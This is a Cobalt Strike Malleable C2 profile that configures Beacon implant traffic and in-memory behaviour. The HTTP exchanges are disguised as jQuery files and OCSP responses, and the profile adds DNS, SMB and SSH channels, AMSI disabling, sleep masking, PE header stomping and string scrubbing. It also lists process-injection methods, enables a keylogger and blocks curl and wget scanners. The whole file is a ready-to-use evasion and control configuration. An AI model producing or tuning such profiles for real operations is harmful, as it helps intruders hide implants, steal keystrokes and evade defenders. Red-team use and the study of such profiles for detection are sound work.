################################################
# Cobalt Strike Malleable C2 Profile
# Version: Cobalt Strike 4.5
# Date   : 20221121_1738

################################################
## Profile Name
################################################
set sample_name "yun_SDXPDEZS";

################################################
## Sleep Times
################################################
set sleeptime "87029";         
set jitter    "43";           

################################################
##  Server Response Size jitter
################################################
set data_jitter "130"; # Append random-length string (up to data_jitter value) to http-get and http-post server output.        

################################################
##  HTTP Client Header Removal
################################################
# set headers_remove "Strict-Transport-Security"; # Comma-separated list of HTTP client headers to remove from Beacon C2.

################################################
## Beacon User-Agent
################################################
set useragent "Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.2.1 Chrome/38.0.2125.122 Safari/537.36 WebAppManager";

################################################
## SSL CERTIFICATE
################################################
https-certificate { # Simple self signed certificate data
    
    set C   "PS";
    set CN  "accessibility.org";
    set O   "v9.1";
    set OU  "etc corp";
    set validity "365";
}

################################################
## Task and Proxy Max Size
################################################
#set tasks_max_size "1048576";
#set tasks_proxy_max_size "921600";
#set tasks_dns_proxy_max_size "71680";

################################################
## TCP Beacon
################################################
set tcp_port "15371"; # TCP beacion listen port
set tcp_frame_header "\x89\xbf\x97\xc0\x76\x52\xe4\xd6\xd8\x69\x7f\xeb\x6f"; # Prepend header to TCP Beacon messages

################################################
## SMB beacons
################################################
set pipename         "WiFiNetMgrQOWD_##"; # Name of pipe for SSH sessions. Each # is replaced with a random hex value.
set pipename_stager  "Winsock2\\CatalogChangeListener-GCAA###-1"; # Name of pipe to use for SMB Beacon's named pipe stager. Each # is replaced with a random hex value.
set smb_frame_header "\xbb\xe0\xa4\xc8\x8a\xa9\x7f\x7a\xbb\xad\x51\x66\xc6\x85\xfa\xd2\x98\x57\x66\xb7\x50"; # Prepend header to SMB Beacon messages

################################################
## DNS beacons
################################################
dns-beacon {
    # Options moved into "dns-beacon" group in version 4.3
    set dns_idle           "148.92.14.87"; # IP address used to indicate no tasks are available to DNS Beacon; Mask for other DNS C2 values
    set dns_max_txt        "252"; # Maximum length of DNS TXT responses for tasks
    set dns_sleep          "67"; # Force a sleep prior to each individual DNS request. (in milliseconds) 
    set dns_ttl            "2"; # TTL for DNS replies
    set maxdns             "251"; # Maximum length of hostname when uploading data over DNS (0-255)
    set dns_stager_prepend ".g."; # Maximum length of hostname when uploading data over DNS (0-255)
    set dns_stager_subhost ".or7l93."; # Subdomain used by DNS TXT record stager.
    set beacon             "62c3b."; # 8 Char max recommended. DNS subhost prefix
    set get_A              "2jxknm4."; # 8 Char max recommended. DNS subhost prefix
    set get_AAAA           "r3ie0."; # 8 Char max recommended. DNS subhost prefix
    set get_TXT            "54."; # 8 Char max recommended. DNS subhost prefix
    set put_metadata       "7d371."; # 8 Char max recommended. DNS subhost prefix
    set put_output         "0."; # 8 Char max recommended. DNS subhost prefix
    set ns_response        "zero"; # How to process NS Record requests. "drop" does not respond to the request (default), "idle" responds with A record for IP address from "dns_idle", "zero" responds with A record for 0.0.0.0

}

################################################
## SSH beacons
################################################
set ssh_banner        "SSH-2.0-OpenSSH_4.8p4 RedHat"; # SSH client banner
set ssh_pipename      "ProtectionManager_KGBV_##"; # Name of pipe for SSH sessions. Each # is replaced with a random hex value.


################################################
## Staging process
################################################
set host_stage "false"; 

http-stager { # Reference: https://www.cobaltstrike.com/help-malleable-c2
    set uri_x86 "/setup/sp/U4W5KW9X7H1"; # URI for x86 staging
    set uri_x64 "/Activate/framework/5B0K5F5HTLV"; # URI for x64 staging

    server {
        header "Server" "gsw";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/json; charset=utf-8";
        output {
            prepend "/*! jQuery v2.2.4 | (c) jQuery Foundation | jquery.org/license */    !function(a,b){'object'==typeof module&&'object'==typeof module.exp    orts?module.exports=a.document?b(a,!0):function(a){if(!a.document)th    row new Error('jQuery requires a window with a document');return b(a    )}:b(a)}('undefined'!=typeof window?window:this,function(a,b){var c=    [],d=a.document,e=c.slice,f=c.concat,g=c.push,h=c.indexOf,i={},j=i.t    oString,k=i.hasOwnProperty,l={},m='2.2.4',n=function(a,b){return new     n.fn.init(a,b)},o=/^[suFEFFxA0]+|[suFEFFxA0]+$/g,p=/^-ms-/,q=/-    ([da-z])/gi,r=function(a,b){return b.toUpperCase()};n.fn=n.prototype    ={jquery:m,constructor:n,selector:'',length:0,toArray:function(){retu    rn e.call(this)},get:function(a){return null!=a?0>a?this[a+this.lengt    h]:this[a]:e.call(this)},pushStack:function(a){var b=n.merge(this.con    structor(),a);return b.prevObject=this,b.context=this.context,b},each:";
            append "/*! jQuery UI - v1.12.1 - 2016-09-14    * http://jqueryui.com    * Includes: widget.js, position.js,    data.js, disable-selection.js, effect.js, effects/effect-blind.js, effects/effect-bounce.js    , effects/effect-clip.js, effects/effect-drop.js, effects/effect-explode.js, effects/effect    -fade.js, effects/effect-fold.js, effects/effect-highlight.js, effects/effect-puff.js, effe    cts/effect-pulsate.js, effects/effect-scale.js, effects/effect-shake.js, effects/effect-s    ize.js, effects/effect-slide.js, effects/effect-transfer.js, focusable.js, form-reset-mix    in.js, jquery-1-7.js, keycode.js, labels.js, scroll-parent.js, tabbable.js, unique-id.js,    widgets/accordion.js, widgets/autocomplete.js, widgets/button.js, widgets/checkboxradio.    js, widgets/controlgroup.js, widgets/datepicker.js, widgets/dialog.js, widgets/draggable    .js, widgets/droppable.js, widgets/menu.js, widgets/mouse.js, widgets/progressbar.js, w    idgets/resizable.js, widgets/selectable.js, widgets/selectmenu.js, widgets/slider.js, w    idgets/sortable.js, widgets/spinner.js, widgets/tabs.js, widgets/tooltip.js    * Copyright jQuery Foundation and other contributors; Licensed MIT */";
            print;
            
        }
    }

    client {
        header "Accept" "application/json, text/html, application/xml";
        header "Accept-Language" "ar-tn";
        header "Accept-Encoding" "*, compress";
    }
}

################################################
## Post Exploitation
################################################
post-ex { # Reference: https://www.cobaltstrike.com/help-malleable-postex
    set spawnto_x86 "%windir%\\syswow64\\svchost.exe -k wksvc";
    set spawnto_x64 "%windir%\\sysnative\\WUAUCLT.exe";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "true";
    set pipename "ProtectionManager_##, Winsock2\\CatalogChangeListener-##-##, Spool\\pipe_##, WkSvcPipeMgr_##, NetClient_##, RPC_##, WiFiNetMgr_##, AuthPipeD_##";
    set keylogger "GetAsyncKeyState"; # options are GetAsyncKeyState or SetWindowsHookEx
    #set thread_hint ""; # specify as module!function+0x##
}


################################################
## Memory Indicators
################################################
stage { # https://www.cobaltstrike.com/help-malleable-postex
    # allocator and RWX settings (Note: HealAlloc uses RXW)
    
    set allocator      "VirtualAlloc";
    set userwx         "false";
     
    set magic_mz_x86   "KCKC";
    set magic_mz_x64   "^V";
    set magic_pe       "MW";
    set stomppe        "true";
    set obfuscate      "true"; # review sleepmask and UDRL considerations for obfuscate
    set cleanup        "true";
    set sleep_mask     "true";
    set smartinject    "true";
    set checksum       "0";
    set compile_time   "24 Jan 2013 11:16:06";
    set entry_point    "406046";
    set image_size_x86 "520007";
    set image_size_x64 "566920";
    set name           "process.dll";
    set rich_header    "\x44\x61\x61\x53\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xeb\x65\xed\xf5\x63\xf2\x70\xf3\xbb\xee\xa0\xb1\x50\xe3\xda\xe0\x85\x50\xb8\x6e\xda\xf8\x96\xc1\x94\xe7\xfd\x90\xa3\x73\x90\xc7\x58\x88\xfe\xc3\x75\xf4\xe2\x87\x97\x7e\xe7\xc4\x98\x7a\xd5\x59\x58\xe0\xd5\x67\xaa\x88\xfb\xf3\x8a\xd8\x93\x79\xa6\xf7\x74\x5f\xc3\xd0\x65\xd0\x73\xb0\xa4\xa5\x52\x69\x63\x68\x7a\xf9\x90\x26\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

    ## WARNING: Module stomping 
    # set module_x86 "netshell.dll"; # Ask the x86 ReflectiveLoader to load the specified library and overwrite its space instead of allocating memory with VirtualAlloc.
    # set module_x64 "netshell.dll"; # Same as module_x86; affects x64 loader

    # The transform-x86 and transform-x64 blocks pad and transform Beacon's Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.
    transform-x86 { # blocks pad and transform Beacon's Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.
        prepend "\x50\x58\x66\x90\x50\x58\x50\x58\x66\x90\x0f\x1f\x80\x00\x00\x00\x00\x0f\x1f\x80\x00\x00\x00\x00\x90\x0f\x1f\x84\x00\x00\x00\x00\x00\x0f\x1f\x40\x00\x0f\x1f\x40\x00\x0f\x1f\x44\x00\x00\x0f\x1f\x44\x00\x00\x0f\x1f\x80\x00\x00\x00\x00\x0f\x1f\x40\x00\x66\x0f\x1f\x44\x00\x00\x50\x58\x66\x90"; # prepend nops
        strrep "ReflectiveLoader" "food";
        strrep "This program cannot be run in DOS mode" ""; # Remove this text
        strrep "beacon.dll" ""; # Remove this text
    }
    transform-x64 { #blocks pad and transform Beacon's Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.
        prepend "\x90\x90\x0f\x1f\x84\x00\x00\x00\x00\x00\x90\x0f\x1f\x84\x00\x00\x00\x00\x00\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x0f\x1f\x44\x00\x00\x0f\x1f\x40\x00\x0f\x1f\x44\x00\x00\x0f\x1f\x80\x00\x00\x00\x00\x66\x0f\x1f\x44\x00\x00\x66\x90"; # prepend nops
        strrep "ReflectiveLoader" "v10.37";
        strrep "beacon.x64.dll" ""; # Remove this text in the Beacon DLL
    }

    stringw "yun_SDXPDEZS"; # Add profile name to tag payloads to this profile
}

################################################
## Process Injection
################################################
process-inject { # Reference: https://www.cobaltstrike.com/help-malleable-postex

    set allocator "VirtualAllocEx"; # Options: VirtualAllocEx, NtMapViewOfSection 
    set min_alloc "20361"; # 	Minimum amount of memory to request for injected content
    set startrwx "false"; # Use RWX as initial permissions for injected content. Alternative is RW.
    
    # review sleepmask and UDRL considerations for userwx
    set userwx   "false"; # Use RWX as final permissions for injected content. Alternative is RX.

    transform-x86 { 
        # Make sure that prepended data is valid code for the injected content's architecture (x86, x64). The c2lint program does not have a check for this.
        prepend "\x0f\x1f\x44\x00\x00\x0f\x1f\x80\x00\x00\x00\x00\x50\x58\x0f\x1f\x84\x00\x00\x00\x00\x00\x50\x58\x0f\x1f\x40\x00\x66\x0f\x1f\x44\x00\x00\x90\x0f\x1f\x80\x00\x00\x00\x00\x0f\x1f\x84\x00\x00\x00\x00\x00\x0f\x1f\x84\x00\x00\x00\x00\x00\x66\x0f\x1f\x44\x00\x00\x90\x0f\x1f\x40\x00\x66\x0f\x1f\x44\x00\x00\x0f\x1f\x44\x00\x00\x0f\x1f\x80\x00\x00\x00\x00\x66\x90\x90";
        append "\x0f\x1f\x40\x00\x66\x0f\x1f\x44\x00\x00\x0f\x1f\x80\x00\x00\x00\x00\x0f\x1f\x44\x00\x00\x90\x0f\x1f\x84\x00\x00\x00\x00\x00\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x66\x0f\x1f\x44\x00\x00\x0f\x1f\x84\x00\x00\x00\x00\x00";
    }

    transform-x64 {
        # Make sure that prepended data is valid code for the injected content's architecture (x86, x64). The c2lint program does not have a check for this.
        prepend "\x0f\x1f\x00\x0f\x1f\x00\x0f\x1f\x00\x0f\x1f\x80\x00\x00\x00\x00\x66\x0f\x1f\x44\x00\x00\x50\x58\x0f\x1f\x80\x00\x00\x00\x00\x0f\x1f\x80\x00\x00\x00\x00\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x66\x90\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x0f\x1f\x44\x00\x00";
        append "\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x50\x58\x66\x0f\x1f\x44\x00\x00\x66\x90\x0f\x1f\x84\x00\x00\x00\x00\x00\x0f\x1f\x80\x00\x00\x00\x00\x0f\x1f\x80\x00\x00\x00\x00\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x0f\x1f\x84\x00\x00\x00\x00\x00\x0f\x1f\x40\x00\x66\x0f\x1f\x44\x00\x00\x50\x58\x90\x0f\x1f\x40\x00\x66\x0f\x1f\x44\x00\x00\x0f\x1f\x84\x00\x00\x00\x00\x00\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x90\x50\x58";
    }
  
    execute {
        # The execute block controls the methods Beacon will use when it needs to inject code into a process. Beacon examines each option in the execute block, determines if the option is usable for the current context, tries the method when it is usable, and moves on to the next option if code execution did not happen. 
        
        CreateThread "ntdll!RtlUserThreadStart+0x536";
        CreateThread;
        NtQueueApcThread-s;
        CreateRemoteThread;
        RtlCreateUserThread; 
    
    }
}

################################################
## HTTP Headers
################################################
http-config { # The http-config block has influence over all HTTP responses served by Cobalt Strike’s web server. 
    set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
    header "Server" "Node.js";
    header "Keep-Alive" "timeout=10, max=100";
    header "Connection" "Keep-Alive";
    # Use this option if your teamserver is behind a redirector
    set trust_x_forwarded_for "true";
    # Block Specific User Agents with a 404 (added in 4.3)
    set block_useragents "curl*,lynx*,wget*";
    # Allow Specific User Agents (added in 4.4);
    # allow_useragents ""; (if specified, block_useragents will take precedence)
}

################################################
## HTTP GET
################################################
http-get { # Don't think of this in terms of HTTP POST, as a beacon transaction of pushing data to the server

    set uri "/Dev/registered/HZUHHW5AFPX"; # URI used for GET requests
    set verb "GET"; 

    client {
        header "Accept" "application/json, text/html, application/xml";
        header "Accept-Language" "ar-tn";
        header "Accept-Encoding" "*, compress";
        header "Content-Type" "application/x-www-form-urltrytryd";
        header "Host" "xxx.gz.apigw.tencentcs.com";

        metadata {
            base64;
            prepend "auth_token5OBA=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "application/ocsp-response";
        header "content-transfer-encoding" "binary";
        header "Server" "Apache";

        output {
            base64;
            prepend "/*! jQuery v3.4.1 | (c) JS Foundation and other contributors | jquery.org/license */    !function(e,t){'use strict';'object'==typeof module&&'object'==typeof module.exports?    module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error('jQuery     requires a window with a document');return t(e)}:t(e)}('undefined'!=typeof window?window    :this,function(C,e){'use strict';var t=[],E=C.document,r=Object.getPrototypeOf,s=t.slice    ,g=t.concat,u=t.push,i=t.indexOf,n={},o=n.toString,v=n.hasOwnProperty,a=v.toString,l=    a.call(Object),y={},m=function(e){return'function'==typeof e&&'number'!=typeof e.nodeType}    ,x=function(e){return null!=e&&e===e.window},c={type:!0,src:!0,nonce:!0,noModule:!0};fun    ction b(e,t,n){var r,i,o=(n=n||E).createElement('script');if(o.text=e,t)for(r in c)(i=t[    r]||t.getAttribute&&t.getAttribute(r))&&o.setAttribute(r,i);n.head.appendChild(o).parentNode;";
            append "/*! jQuery v3.4.1 | (c) JS Foundation and other contributors | jquery.org/license */    !function(e,t){'use strict';'object'==typeof module&&'object'==typeof module.exports?    module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error('jQuery     requires a window with a document');return t(e)}:t(e)}('undefined'!=typeof window?window    :this,function(C,e){'use strict';var t=[],E=C.document,r=Object.getPrototypeOf,s=t.slice    ,g=t.concat,u=t.push,i=t.indexOf,n={},o=n.toString,v=n.hasOwnProperty,a=v.toString,l=    a.call(Object),y={},m=function(e){return'function'==typeof e&&'number'!=typeof e.nodeType}    ,x=function(e){return null!=e&&e===e.window},c={type:!0,src:!0,nonce:!0,noModule:!0};fun    ction b(e,t,n){var r,i,o=(n=n||E).createElement('script');if(o.text=e,t)for(r in c)(i=t[    r]||t.getAttribute&&t.getAttribute(r))&&o.setAttribute(r,i);n.head.appendChild(o).parentNode;";
            print;
        }
    }

}

################################################
## HTTP POST
################################################
http-post { # Don't think of this in terms of HTTP POST, as a beacon transaction of pushing data to the server

    set uri "/Adapt/disclosure/XT9A6W5YM8"; # URI used for POST block.
    set verb "POST"; # HTTP verb used in POST block. Can be GET or POST

    client {
        header "Accept" "application/json, text/html, application/xml";
        header "Accept-Language" "ar-tn";
        header "Accept-Encoding" "*, compress";
        header "Content-Type" "application/x-www-form-urltrytryd";
        header "Host" "xxx.gz.apigw.tencentcs.com";

        id {
            base64;
            prepend "auth_token5OBA=";
            header "Cookie";
        }
        output {
            base64;
            print;
        }
    }

    server {
        header "Content-Type" "application/ocsp-response";
        header "content-transfer-encoding" "binary";
        header "Connection" "keep-alive";
        output {
            base64;
            prepend "/*! jQuery v3.4.1 | (c) JS Foundation and other contributors | jquery.org/license */    !function(e,t){'use strict';'object'==typeof module&&'object'==typeof module.exports?    module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error('jQuery     requires a window with a document');return t(e)}:t(e)}('undefined'!=typeof window?window    :this,function(C,e){'use strict';var t=[],E=C.document,r=Object.getPrototypeOf,s=t.slice    ,g=t.concat,u=t.push,i=t.indexOf,n={},o=n.toString,v=n.hasOwnProperty,a=v.toString,l=    a.call(Object),y={},m=function(e){return'function'==typeof e&&'number'!=typeof e.nodeType}    ,x=function(e){return null!=e&&e===e.window},c={type:!0,src:!0,nonce:!0,noModule:!0};fun    ction b(e,t,n){var r,i,o=(n=n||E).createElement('script');if(o.text=e,t)for(r in c)(i=t[    r]||t.getAttribute&&t.getAttribute(r))&&o.setAttribute(r,i);n.head.appendChild(o).parentNode;";
            append "/*! jQuery v3.4.1 | (c) JS Foundation and other contributors | jquery.org/license */    !function(e,t){'use strict';'object'==typeof module&&'object'==typeof module.exports?    module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error('jQuery     requires a window with a document');return t(e)}:t(e)}('undefined'!=typeof window?window    :this,function(C,e){'use strict';var t=[],E=C.document,r=Object.getPrototypeOf,s=t.slice    ,g=t.concat,u=t.push,i=t.indexOf,n={},o=n.toString,v=n.hasOwnProperty,a=v.toString,l=    a.call(Object),y={},m=function(e){return'function'==typeof e&&'number'!=typeof e.nodeType}    ,x=function(e){return null!=e&&e===e.window},c={type:!0,src:!0,nonce:!0,noModule:!0};fun    ction b(e,t,n){var r,i,o=(n=n||E).createElement('script');if(o.text=e,t)for(r in c)(i=t[    r]||t.getAttribute&&t.getAttribute(r))&&o.setAttribute(r,i);n.head.appendChild(o).parentNode;";
            print;
        }
    }
}